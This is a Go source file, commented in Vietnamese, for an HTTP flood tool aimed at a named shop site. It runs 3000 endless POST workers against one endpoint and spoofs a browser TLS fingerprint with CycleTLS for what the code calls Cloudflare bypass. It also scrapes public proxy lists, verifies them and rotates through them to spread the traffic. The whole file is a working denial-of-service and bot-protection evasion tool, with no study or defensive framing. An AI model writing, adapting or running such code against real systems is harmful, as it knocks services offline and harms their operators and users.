package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/Danny-Dasilva/CycleTLS/cycletls"
)

const (
	TARGET_URL      = "https://dkshop.dev/controllers/dkshop"
	WORKERS         = 3000  // Cân bằng giữa 1000 và 5000
	REQ_TIMEOUT     = 8 * time.Second  // Tăng lên 8s để giảm timeout
	PROXY_TEST_TO   = 10 * time.Second
	VERIFY_CONC     = 100  // Giữ nguyên
	MIN_POOL        = 30   // Giữ nguyên
	REFETCH_EVERY   = 120 * time.Second
)

// ── Stats ─────────────────────────────────────────────────────────────────────
var (
	statSent    int64
	statSuccess int64
	statFail    int64
	statBytes   int64
)

// ── Random generators ─────────────────────────────────────────────────────────
var (
	firstNames = []string{"James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Linda","Barbara","Elizabeth","Susan","Jessica","Sarah","Karen","Liam","Noah","Oliver","Elijah","Lucas","Mason","Logan","Ethan","Aiden","Emma","Olivia","Ava","Isabella","Sophia","Mia"}
	lastNames  = []string{"Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Martinez","Wilson","Anderson","Taylor","Thomas","Jackson","White","Harris","Martin","Thompson","Robinson","Clark"}
	domains    = []string{"gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","mail.com","tutanota.com","gmx.com","zoho.com"}
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0",
	}
)

func randStr(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b { b[i] = chars[mathrand.Intn(len(chars))] }
	return string(b)
}
func randName()  string { return firstNames[mathrand.Intn(len(firstNames))] + " " + lastNames[mathrand.Intn(len(lastNames))] }
func randEmail() string {
	return strings.ToLower(firstNames[mathrand.Intn(len(firstNames))]) +
		strings.ToLower(lastNames[mathrand.Intn(len(lastNames))]) +
		strconv.Itoa(mathrand.Intn(99999)) + "@" + domains[mathrand.Intn(len(domains))]
}
func randPass() string { return randStr(8) + strconv.Itoa(mathrand.Intn(9999)) }
func randUA()   string { return userAgents[mathrand.Intn(len(userAgents))] }

func buildBody() string {
	v := url.Values{}
	v.Set("action", "load_products")
	v.Set("category", "all")
	v.Set("csrf_token", "DWU3NkWoy1cnETdwEd26mSLvHz20QL6KsBSL3Xbn2e0%3D")
	return v.Encode()
}

// Cache body để tránh build mỗi lần
var cachedBody = buildBody()

// ── Proxy pool ────────────────────────────────────────────────────────────────
type Proxy struct{ Scheme, Host string; Port int }
func (p Proxy) URL() string { return fmt.Sprintf("%s://%s:%d", p.Scheme, p.Host, p.Port) }

var (
	goodPool   []Proxy
	poolMu     sync.RWMutex
	poolIdx    int64
	isFetching int32
	// signal: pool đã đủ MIN_POOL để bắt đầu
	poolReady  = make(chan struct{})
	poolOnce   sync.Once
)

var PROXY_SOURCES = []struct{ URL, Scheme string }{
	// SOCKS5
	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"},
	{"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt", "socks5"},
	{"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", "socks5"},
	// SOCKS4
	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", "socks4"},
	{"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt", "socks4"},
	// HTTP
	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "http"},
	{"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt", "http"},
	{"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", "http"},
	{"https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all", "http"},
	{"https://api.proxyscrape.com/v2/?request=get&protocol=socks4&timeout=10000&country=all", "socks4"},
	{"https://api.proxyscrape.com/v2/?request=get&protocol=socks5&timeout=10000&country=all", "socks5"},
}

// ── Fetch raw list ────────────────────────────────────────────────────────────
func fetchText(u string) string {
	client := cycletls.Init()
	if client.ReqChan == nil {
		return ""
	}
	defer func() {
		if client.ReqChan != nil {
			client.Close()
		}
	}()

	response, err := client.Do(u, cycletls.Options{
		Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
		Timeout:   15,
	}, "GET")

	if err != nil {
		return ""
	}
	return response.Body
}

func fetchRaw() []Proxy {
	type res struct{ list []Proxy }
	ch := make(chan res, len(PROXY_SOURCES))
	for _, src := range PROXY_SOURCES {
		go func(u, scheme string) {
			list := []Proxy{}
			sc := bufio.NewScanner(strings.NewReader(fetchText(u)))
			for sc.Scan() {
				line := strings.TrimSpace(sc.Text())
				for _, pfx := range []string{"socks5://","socks4://","http://","https://"} {
					line = strings.TrimPrefix(line, pfx)
				}
				hp := strings.SplitN(line, ":", 2)
				if len(hp) != 2 { continue }
				if net.ParseIP(hp[0]) == nil { continue }
				port, err := strconv.Atoi(strings.TrimSpace(hp[1]))
				if err != nil || port <= 0 || port > 65535 { continue }
				list = append(list, Proxy{scheme, hp[0], port})
			}
			ch <- res{list}
		}(src.URL, src.Scheme)
	}

	seen := map[string]bool{}
	all := []Proxy{}
	for i := 0; i < len(PROXY_SOURCES); i++ {
		r := <-ch
		for _, p := range r.list {
			k := p.Host+":"+strconv.Itoa(p.Port)
			if !seen[k] { seen[k]=true; all=append(all, p) }
		}
	}
	mathrand.Shuffle(len(all), func(i,j int){ all[i],all[j]=all[j],all[i] })
	return all
}

// ── Verify proxy với CycleTLS ────────────────────────────────────────────────
func verifyProxy(p Proxy) bool {
	client := cycletls.Init()
	if client.ReqChan == nil {
		return false
	}
	defer func() {
		if client.ReqChan != nil {
			client.Close()
		}
	}()

	_, err := client.Do("https://dkshop.dev/controllers/dkshop", cycletls.Options{
		Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
		Proxy:     p.URL(),
		Timeout:   int(PROXY_TEST_TO.Seconds()),
	}, "GET")

	return err == nil
}

// ── Stream verify: check song song 500 proxy, push vào pool ngay khi OK ──────
func streamVerify(raw []Proxy) {
	sem   := make(chan struct{}, VERIFY_CONC)
	var tested, ok int64
	total := int64(len(raw))

	for _, p := range raw {
		sem <- struct{}{}
		go func(px Proxy) {
			defer func() { <-sem }()
			good := verifyProxy(px)
			t := atomic.AddInt64(&tested, 1)
			if good {
				n := atomic.AddInt64(&ok, 1)
				poolMu.Lock()
				goodPool = append(goodPool, px)
				size := len(goodPool)
				poolMu.Unlock()
				// Signal khi đủ MIN_POOL
				if size >= MIN_POOL {
					poolOnce.Do(func() { close(poolReady) })
				}
				_ = n
			}
			if t % 500 == 0 || t == total {
				poolMu.RLock()
				sz := len(goodPool)
				poolMu.RUnlock()
				fmt.Printf("\r[Verify] %d/%d tested | good: %d          ", t, total, sz)
			}
		}(p)
	}
	// drain semaphore
	for i := 0; i < VERIFY_CONC; i++ { sem <- struct{}{} }
	poolMu.RLock()
	sz := len(goodPool)
	poolMu.RUnlock()
	fmt.Printf("\n[Verify] Done. Good proxies: %d\n", sz)
	// Đảm bảo signal dù ít hơn MIN_POOL
	poolOnce.Do(func() { close(poolReady) })
}

func getProxy() Proxy {
	poolMu.RLock()
	defer poolMu.RUnlock()
	if len(goodPool) == 0 { return Proxy{} }
	idx := atomic.AddInt64(&poolIdx, 1) % int64(len(goodPool))
	return goodPool[idx]
}

func removeProxy(p Proxy) {
	poolMu.Lock()
	defer poolMu.Unlock()
	for i, x := range goodPool {
		if x.Host == p.Host && x.Port == p.Port {
			goodPool = append(goodPool[:i], goodPool[i+1:]...)
			return
		}
	}
}

// ── CycleTLS client pool ─────────────────────────────────────────────────────
var (
	cycleTLSClient cycletls.CycleTLS
	clientOnce     sync.Once
	useCycleTLS    bool
	clientMu       sync.Mutex
)

func getCycleTLSClient() cycletls.CycleTLS {
	clientOnce.Do(func() {
		fmt.Println("[DEBUG] Initializing CycleTLS client...")
		cycleTLSClient = cycletls.Init()
		if cycleTLSClient.ReqChan == nil {
			fmt.Println("[ERROR] CycleTLS failed to initialize!")
			useCycleTLS = false
		} else {
			fmt.Println("[DEBUG] CycleTLS initialized successfully")
			useCycleTLS = true
		}
	})
	return cycleTLSClient
}

// ── HTTP fallback client ──────────────────────────────────────────────────────
func newHTTPClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   REQ_TIMEOUT,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   REQ_TIMEOUT,
		ResponseHeaderTimeout: REQ_TIMEOUT,
		MaxIdleConnsPerHost:   50,
		IdleConnTimeout:       30 * time.Second,
	}
	return &http.Client{
		Transport: tr,
		Timeout:   REQ_TIMEOUT,
	}
}

var httpClient = newHTTPClient()

// ── Worker với CycleTLS hoặc HTTP fallback ───────────────────────────────────
func workerDirect() {
	client := getCycleTLSClient()
	var cookies string

	// Cache headers để tránh tạo mới mỗi lần
	baseHeaders := map[string]string{
		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language":  "en-US,en;q=0.9",
		"Accept-Encoding":  "gzip, deflate, br",
		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
		"X-Requested-With": "XMLHttpRequest",
		"Origin":           "https://dkshop.dev",
		"Referer":          "https://dkshop.dev/",
		"Connection":       "keep-alive",
		"Sec-Fetch-Dest":   "empty",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Site":   "same-origin",
	}

	for {
		atomic.AddInt64(&statSent, 1)

		if useCycleTLS {
			// Dùng CycleTLS
			opts := cycletls.Options{
				Body:      cachedBody,
				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
				Headers:   baseHeaders,
				Timeout:   int(REQ_TIMEOUT.Seconds()),
			}

			if cookies != "" {
				opts.Headers["Cookie"] = cookies
			}

			response, err := client.Do(TARGET_URL, opts, "POST")

			if err != nil {
				atomic.AddInt64(&statFail, 1)
				continue
			}

			// Lưu cookies từ response
			if setCookie, ok := response.Headers["Set-Cookie"]; ok {
				cookies = setCookie
			}

			atomic.AddInt64(&statBytes, int64(len(response.Body)+len(cachedBody)))
			atomic.AddInt64(&statSuccess, 1)
		} else {
			// Fallback HTTP thông thường
			req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(cachedBody))
			if err != nil {
				atomic.AddInt64(&statFail, 1)
				continue
			}

			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36")
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			req.Header.Set("X-Requested-With", "XMLHttpRequest")
			req.Header.Set("Origin", "https://dkshop.dev")
			req.Header.Set("Referer", "https://dkshop.dev/")
			if cookies != "" {
				req.Header.Set("Cookie", cookies)
			}

			resp, err := httpClient.Do(req)
			if err != nil {
				atomic.AddInt64(&statFail, 1)
				continue
			}

			// Lưu cookies
			if setCookie := resp.Header.Get("Set-Cookie"); setCookie != "" {
				cookies = setCookie
			}

			resp.Body.Close()
			atomic.AddInt64(&statBytes, int64(len(cachedBody)))
			atomic.AddInt64(&statSuccess, 1)
		}
	}
}

func workerProxy() {
	client := getCycleTLSClient()
	var curProxy Proxy
	var cookies string
	failCount := 0

	// Cache headers
	baseHeaders := map[string]string{
		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language":  "en-US,en;q=0.9",
		"Accept-Encoding":  "gzip, deflate, br",
		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
		"X-Requested-With": "XMLHttpRequest",
		"Origin":           "https://dkshop.dev",
		"Referer":          "https://dkshop.dev/",
		"Connection":       "keep-alive",
		"Sec-Fetch-Dest":   "empty",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Site":   "same-origin",
	}

	for {
		// Lấy proxy mới nếu fail nhiều
		if curProxy.Host == "" || failCount >= 3 {
			curProxy = getProxy()
			if curProxy.Host == "" {
				time.Sleep(50 * time.Millisecond)
				continue
			}
			failCount = 0
			cookies = "" // Reset cookies khi đổi proxy
		}

		atomic.AddInt64(&statSent, 1)

		if useCycleTLS {
			// Dùng CycleTLS với proxy
			opts := cycletls.Options{
				Body:      cachedBody,
				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
				Proxy:     curProxy.URL(),
				Headers:   baseHeaders,
				Timeout:   int(REQ_TIMEOUT.Seconds()),
			}

			if cookies != "" {
				opts.Headers["Cookie"] = cookies
			}

			response, err := client.Do(TARGET_URL, opts, "POST")

			if err != nil {
				atomic.AddInt64(&statFail, 1)
				failCount++
				if failCount >= 3 {
					removeProxy(curProxy)
					curProxy = Proxy{}
				}
				continue
			}

			// Lưu cookies
			if setCookie, ok := response.Headers["Set-Cookie"]; ok {
				cookies = setCookie
			}

			atomic.AddInt64(&statBytes, int64(len(response.Body)+len(cachedBody)))
			atomic.AddInt64(&statSuccess, 1)
			failCount = 0
		} else {
			// Fallback HTTP với proxy
			proxyURL, _ := url.Parse(curProxy.URL())
			tr := &http.Transport{
				Proxy:                 http.ProxyURL(proxyURL),
				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
				DialContext:           (&net.Dialer{Timeout: REQ_TIMEOUT}).DialContext,
				TLSHandshakeTimeout:   REQ_TIMEOUT,
				ResponseHeaderTimeout: REQ_TIMEOUT,
			}
			proxyClient := &http.Client{Transport: tr, Timeout: REQ_TIMEOUT}

			req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(cachedBody))
			if err != nil {
				atomic.AddInt64(&statFail, 1)
				failCount++
				continue
			}

			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			req.Header.Set("X-Requested-With", "XMLHttpRequest")
			req.Header.Set("Origin", "https://dkshop.dev")
			req.Header.Set("Referer", "https://dkshop.dev/")
			if cookies != "" {
				req.Header.Set("Cookie", cookies)
			}

			resp, err := proxyClient.Do(req)
			if err != nil {
				atomic.AddInt64(&statFail, 1)
				failCount++
				if failCount >= 3 {
					removeProxy(curProxy)
					curProxy = Proxy{}
				}
				continue
			}

			// Lưu cookies
			if setCookie := resp.Header.Get("Set-Cookie"); setCookie != "" {
				cookies = setCookie
			}

			resp.Body.Close()
			atomic.AddInt64(&statBytes, int64(len(cachedBody)))
			atomic.AddInt64(&statSuccess, 1)
			failCount = 0
		}
	}
}

// ── Stats ─────────────────────────────────────────────────────────────────────
func fmtBytes(b int64) string {
	switch {
	case b >= 1<<30: return fmt.Sprintf("%.2fGB", float64(b)/(1<<30))
	case b >= 1<<20: return fmt.Sprintf("%.2fMB", float64(b)/(1<<20))
	case b >= 1<<10: return fmt.Sprintf("%.2fKB", float64(b)/(1<<10))
	default:         return fmt.Sprintf("%dB", b)
	}
}

func statsLoop(start time.Time, useProxy bool) {
	var lastS, lastF int64
	for range time.Tick(time.Second) {
		curS  := atomic.LoadInt64(&statSuccess)
		curF  := atomic.LoadInt64(&statFail)
		curSt := atomic.LoadInt64(&statSent)
		curB  := atomic.LoadInt64(&statBytes)
		rps   := curS - lastS
		fps   := curF - lastF
		lastS, lastF = curS, curF
		elapsed := time.Since(start).Seconds()
		poolSz := 0
		if useProxy { poolMu.RLock(); poolSz = len(goodPool); poolMu.RUnlock() }
		if useProxy {
			fmt.Printf("\r[%.0fs] sent:%d ok/s:%d fail/s:%d total_ok:%d data:%s pool:%d     ",
				elapsed, curSt, rps, fps, curS, fmtBytes(curB), poolSz)
		} else {
			fmt.Printf("\r[%.0fs] sent:%d ok/s:%d fail/s:%d total_ok:%d data:%s     ",
				elapsed, curSt, rps, fps, curS, fmtBytes(curB))
		}
	}
}

// ── Main ──────────────────────────────────────────────────────────────────────
func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	mathrand.Seed(time.Now().UnixNano())

	fmt.Printf("[*] Target : %s\n", TARGET_URL)
	fmt.Printf("[*] Workers: %d | Timeout: %v\n\n", WORKERS, REQ_TIMEOUT)

	// Tự động chọn mode từ environment variable hoặc hỏi user
	useProxy := false
	if mode := os.Getenv("ATTACK_MODE"); mode != "" {
		useProxy = strings.ToLower(mode) == "proxy"
		if useProxy {
			fmt.Println("[*] Mode: PROXY (from env)")
		} else {
			fmt.Println("[*] Mode: DIRECT (from env)")
		}
	} else {
		fmt.Print("Dùng proxy? (y/n): ")
		reader := bufio.NewReader(os.Stdin)
		ans, _ := reader.ReadString('\n')
		useProxy = strings.TrimSpace(strings.ToLower(ans)) == "y"
	}

	if useProxy {
		fmt.Printf("[*] Fetch raw từ %d nguồn song song...\n", len(PROXY_SOURCES))
		raw := fetchRaw()
		fmt.Printf("[*] Raw: %d proxies → verify x%d concurrency...\n", len(raw), VERIFY_CONC)

		// Verify stream ngầm, spam khi đủ MIN_POOL
		go streamVerify(raw)

		fmt.Printf("[*] Chờ đủ %d proxy OK rồi spam...\n", MIN_POOL)
		<-poolReady
		poolMu.RLock()
		sz := len(goodPool)
		poolMu.RUnlock()
		fmt.Printf("[*] Pool: %d OK → BẮT ĐẦU SPAM\n\n", sz)

		// Refetch + reverify mỗi REFETCH_EVERY
		go func() {
			for range time.Tick(REFETCH_EVERY) {
				fmt.Print("\n[Pool] Refetch...\n")
				r := fetchRaw()
				poolMu.RLock()
				ex := map[string]bool{}
				for _, p := range goodPool { ex[p.Host+":"+strconv.Itoa(p.Port)] = true }
				poolMu.RUnlock()
				fresh := []Proxy{}
				for _, p := range r {
					if !ex[p.Host+":"+strconv.Itoa(p.Port)] { fresh = append(fresh, p) }
				}
				go streamVerify(fresh)
			}
		}()

		start := time.Now()
		fmt.Printf("[*] Starting %d proxy workers...\n", WORKERS)
		for i := 0; i < WORKERS; i++ { go workerProxy() }
		statsLoop(start, true)
	} else {
		fmt.Println("[*] Direct mode - max speed")
		fmt.Println("[*] Testing connection first...")

		// Test CycleTLS trước
		testClient := getCycleTLSClient()

		if useCycleTLS {
			fmt.Println("[*] Using CycleTLS for Cloudflare bypass")
			testBody := buildBody()
			testResp, testErr := testClient.Do(TARGET_URL, cycletls.Options{
				Body:      testBody,
				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
				Headers: map[string]string{
					"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
					"X-Requested-With": "XMLHttpRequest",
					"Origin":           "https://dkshop.dev",
					"Referer":          "https://dkshop.dev/",
				},
				Timeout: int(REQ_TIMEOUT.Seconds()),
			}, "POST")

			if testErr != nil {
				fmt.Printf("[ERROR] CycleTLS test request failed: %v\n", testErr)
				fmt.Println("[WARNING] Continuing anyway, workers will handle errors...")
			} else {
				fmt.Printf("[SUCCESS] CycleTLS test OK! Status: %d, Body: %d bytes\n", testResp.Status, len(testResp.Body))
			}
		} else {
			fmt.Println("[*] CycleTLS not available, using standard HTTP")
			testBody := buildBody()
			ctx, cancel := context.WithTimeout(context.Background(), REQ_TIMEOUT)
			defer cancel()
			testReq, _ := http.NewRequestWithContext(ctx, "POST", TARGET_URL, strings.NewReader(testBody))
			testReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
			testReq.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			testReq.Header.Set("X-Requested-With", "XMLHttpRequest")
			testReq.Header.Set("Origin", "https://dkshop.dev")
			testReq.Header.Set("Referer", "https://dkshop.dev/")

			testResp, testErr := httpClient.Do(testReq)
			if testErr != nil {
				fmt.Printf("[ERROR] HTTP test request failed: %v\n", testErr)
				fmt.Println("[WARNING] Continuing anyway, workers will handle errors...")
			} else {
				testResp.Body.Close()
				fmt.Printf("[SUCCESS] HTTP test OK! Status: %d\n", testResp.StatusCode)
			}
		}

		start := time.Now()
		fmt.Printf("[*] Starting %d direct workers...\n", WORKERS)
		for i := 0; i < WORKERS; i++ { go workerDirect() }
		statsLoop(start, false)
	}
}
